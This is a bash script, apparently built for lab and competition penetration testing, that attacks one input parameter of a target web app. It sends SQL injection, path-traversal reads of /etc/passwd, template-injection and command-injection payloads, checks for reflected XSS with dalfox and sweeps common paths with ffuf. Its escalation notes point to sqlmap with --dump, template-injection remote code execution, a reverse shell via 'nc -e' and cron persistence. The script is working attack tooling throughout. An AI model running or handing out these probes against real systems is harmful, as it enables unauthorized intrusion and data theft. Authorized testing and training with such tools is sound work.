#!/usr/bin/env bash
# ==============================================================================
# web-vuln-tests.sh — probe ONE input parameter for the classic bug classes:
#   SQLi / LFI / SSTI / XSS (reflection + dalfox execution test), plus quick paths
#   and an arjun param-discovery fallback when no ?param exists.
#
# CONCEPT: after web-recon.sh hands you the attack surface, you pick a page that
# ACCEPTS INPUT (anything with a ?param=value, a form field, a search box) and
# point this script at that URL. It mutates that one param with safe, noisy
# payloads and looks for anomalies. It will NOT "shoulder-surf" an app that has
# no inputs — static pages with no ?param legitimately produce zero hits.
#
# HOW TO USE:
#   ./web-vuln-tests.sh "http://10.10.20.15:8080/app"
#   ./web-vuln-tests.sh "http://10.10.20.15/search?q=1"
#                                                ^ param  ^ any normal value
#
# WHERE TO GET PARAMS FROM (if none obvious):
#   * this script falls back to arjun automatically (if installed — install.sh adds it)
#   * view-source: in the browser — <form> names, <input name="...">, array keys
#   * ffuf param names:
#       ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
#            -u "http://IP/page.php?FUZZ=1" -fs <baseline-size>
#   * Burp: send a request, watch POST bodies (user=, id=, username=...)
#
# OUTPUT: loot/vuln-tests-HHMM/ ALWAYS has hits.txt (even when zero — a clean
# pass IS a finding for the report: "param tested for class X, no anomalies").
# ==============================================================================

set -u
URL="${1:-}"
[ -z "$URL" ] && { echo "usage: $0 \"http://TARGET/page?param=value\""; exit 1; }

has() { command -v "$1" >/dev/null 2>&1; }

mkdir -p loot
T=$(date +%H%M)
OUT="loot/vuln-tests-$T"
mkdir -p "$OUT"
HITS="$OUT/hits.txt"
STEPS="$OUT/manual-next-steps.txt"
: > "$HITS"; : > "$STEPS"
echo "[*] Testing: $URL"
echo "[*] Loot:    $OUT/"

# Split the url into base, param, value
BASE="${URL%%\?*}"
Q="${URL#*\?}"
PARAM="id"; VAL=""
if [ "$Q" != "$URL" ]; then
    PARAM=$(echo "$Q" | cut -d= -f1)
    VAL=$(echo "$Q" | cut -d= -f2-)
fi
echo "[*] Focusing on param:    '$PARAM'  value '$VAL'"
echo "[*] Baseline:             '$BASE'"

# Reachability check first — fail fast with a clear message
REACH=$(curl -sk --max-time 6 -o /dev/null -w '%{http_code}' "$BASE")
echo "[*] Baseline http code:   $REACH"
if [ "$REACH" = "000" ]; then
    echo "[!] Target is DOWN or unreachable (000). Check the machine still exists"
    echo "    (THM panel) / is not /127.0.0.1 typo'd / box needs VPN up."
    echo "[i] negative result recorded in $HITS"
    echo "[!] target unreachable (000) — nothing probed" >> "$HITS"
    exit 0
fi

if [ -z "$VAL" ]; then
    echo "[!] No ?param=value in this URL."
    if has arjun; then
        echo "[*] falling back to ARJUN (hurricane param discovery — GET+POST probe)..."
        arjun -u "$BASE" -t 10 2>/dev/null | tee "$OUT/arjun.txt"
        FOUND=$(grep -icE 'parameter found|found.*param|^\[i] ' "$OUT/arjun.txt" 2>/dev/null)
        if [ -s "$OUT/arjun.txt" ] && grep -qiE 'parameter|found' "$OUT/arjun.txt"; then
            echo "  [i] arjun found candidate params (see $OUT/arjun.txt)."
            echo "  RERUN me as: $0 \"\$BASE?PARAM=value\" with each one" | tee -a "$HITS"
        else
            echo "  [-] arjun found nothing either — page likely takes POST-only or no input"
        fi
        echo "[i] params got discovered by arjun — logged in $OUT/arjun.txt" >> "$HITS"
        exit 0
    fi
    echo "[i] Pick a URL with an input (form page / search / ?id), then rerun."
    echo "[i] Auto fallback missing: apt install arjun (see install.sh, --), or try:"
    echo "    view-source in browser, or ffuf burp-parameter-names.txt"
    echo "[i] target has no input param — nothing probed, this is not an error" >> "$HITS"
    exit 0
fi

# ---------- 1. SQLi — visible-error strings + response-differential ----------
echo "[*] [1/6] SQLi probing (error strings + response diff)..."
LEN0=$(curl -sk --max-time 5 "$BASE?$PARAM=$VAL" | wc -c)
for P in "'" "\x27" "%27%20OR%20%271%27%3D%271" "1%27--" "1%20OR%201%3D1"; do
    RESP=$(curl -sk --max-time 5 "$BASE?$PARAM=$VAL$P")
    LEN=$(echo "$RESP" | wc -c)
    M=$(echo "$RESP" | grep -icE \
       'sql|syntax|db error|mysql|postgres|sqlite|odbc|entity|unterminated|no such|nopermission|syntaxerror')
    if [ "$M" -gt 0 ]; then
        echo "  [+] SQL-ish error surfaced on $PARAM$P"
        echo "  [+] SQL-ish error surfaced on $PARAM$P" >> "$HITS"
    elif [ $((LEN > LEN0 ? LEN - LEN0 : LEN0 - LEN)) -gt 60 ]; then
        echo "  [?] response size differs ${LEN}/${LEN0} on $PARAM$P — manual check worth it"
        echo "  [?] response size differs ${LEN}/${LEN0} on $PARAM$P — manual check worth it" >> "$HITS"
    fi
done
if [ -s "$HITS" ]; then
    echo "  sqlmap: sqlmap -u '$URL' -p $PARAM --batch --risk=1 --level=1 --dump" >> "$STEPS"
fi

# ---------- 2. LFI ------------------------------------------------------------
echo "[*] [2/6] LFI probing (/etc/passwd variants)..."
for P in /etc/passwd ../../../../etc/passwd ....//....//etc/passwd \
         php://filter/convert.base64-encode/resource=../etc/passwd; do
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
    R=$(curl -sk --max-time 5 "$BASE?$PARAM=$ENC" | grep -c 'root:x:')
    [ "$R" -gt 0 ] && echo "  [+] LFI hit: root:x served back on $PARAM ($P)" | tee -a "$HITS"
done
grep -q "LFI" "$HITS" && echo "  escalate: read config files, log poisoning, php:// wrappers" >> "$STEPS"

# ---------- 3. SSTI — Jinja ({{7*7}}) AND Spring/JSP-style (${7*7}) ------------
echo "[*] [3/6] SSTI probing ({{7*7}} and \${7*7} -> 49)..."
for P in '%7B%7B7%2A7%7D%7D' '%24%7B7%2A7%7D'; do
    R=$(curl -sk --max-time 5 "$BASE?$PARAM=$P" | grep -o '49')
    if [ -n "$R" ]; then
        if [ "$P" = '%24%7B7%2A7%7D' ]; then
            echo "  [+] SSTI: \${7*7} rendered as 49 (Spring/Velocity/JSP family)" | tee -a "$HITS"
        else
            echo "  [+] SSTI: {{7*7}} rendered as 49 on $PARAM (Jinja/Twig family)" | tee -a "$HITS"
        fi
    fi
done
grep -q "SSTI" "$HITS" && echo "  escalate: {{config}} {%import os%} class-chain RCE payloads" >> "$STEPS"

# ---------- 4. XSS — reflection marker, then dalfox execution test (if present -
echo "[*] [4/6] XSS check (reflection marker + dalfox)..."
P="cstcv8"   # unlikely string; if it comes back → param is reflected
RESP=$(curl -sk --max-time 5 "$BASE?$PARAM=$P")
REFLECTED=0
if echo "$RESP" | grep -q "$P"; then
    echo "  [i] param '$PARAM' is REFLECTED (XSS possible)" | tee -a "$HITS"
    REFLECTED=1
    if has dalfox; then
        echo "[*] dalfox execution test on '$PARAM' (see $OUT/dalfox.txt)..."
        dalfox url "$BASE?$PARAM=cstcv8" --skip-benign-params 2>/dev/null | tee "$OUT/dalfox.txt"
        if grep -qE '\[V\]|\[POC\]|RCE' "$OUT/dalfox.txt" 2>/dev/null; then
            echo "  [+] dalfox CONFIRMED working payload(s) in $PARAM — see $OUT/dalfox.txt" | tee -a "$HITS"
        fi
    else
        echo "  [i] dalfox not installed (install.sh adds it) — confirming by hand:"
    fi
    echo "  confirm manually with browser markers: <script>alert(1)</script>, then try from script list" >> "$STEPS"
fi

# ---------- 5. Command-injection quickie (cheap + CPTC-class favorite) ---------
echo "[*] [5/6] command-injection probe..."
for P in '%3Bid%3B' '%24%28id%29' '%7Cid'; do   # ;id;  $(id)  |id
    OUT_SYS=$(curl -sk --max-time 5 "$BASE?$PARAM=$VAL$P" | grep -oE '(uid|gid)=[0-9]+')
    [ -n "$OUT_SYS" ] && echo "  [+] CMDi: got shell output back on $PARAM ($OUT_SYS) via $P" | tee -a "$HITS"
done
grep -q "CMDi" "$HITS" && echo "  escalate: reverse shell (nc -e), /etc/passwd append, cron" >> "$STEPS"

# ---------- 6. Quick-hits directory wordlist ----------------------------------
echo "[*] [6/6] quick-hits path sweep on base..."
if has ffuf && [ -f /usr/share/seclists/Discovery/Web-Content/quickhits.txt ]; then
    ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
         -u "$BASE/FUZZ" -mc 200,403 -t 25 -s -of csv -o "$OUT/quickhits.csv" 2>/dev/null
    [ -f "$OUT/quickhits.csv" ] && echo "  [i] quickhits: $OUT/quickhits.csv" | tee -a "$HITS"
fi

# ---------- Summary (never empty) ---------------------------------------------
if [ ! -s "$HITS" ]; then
    echo "  (clean pass: no anomalies on '$PARAM' across SQLi/LFI/SSTI/XSS)" >> "$HITS"
fi
echo ""
echo "===== hits ($HITS) ====="
cat "$HITS"
echo ""
[ -s "$STEPS" ] && { echo "===== next manual steps ====="; cat "$STEPS"; }
echo ""
echo "[i] A clean pass is still a REPORT LINE: 'param $PARAM tested against"
echo "[i] SQLi/LFI/SSTI/XSS-reflection/CMDi with no anomalies' — CPTC loves that."
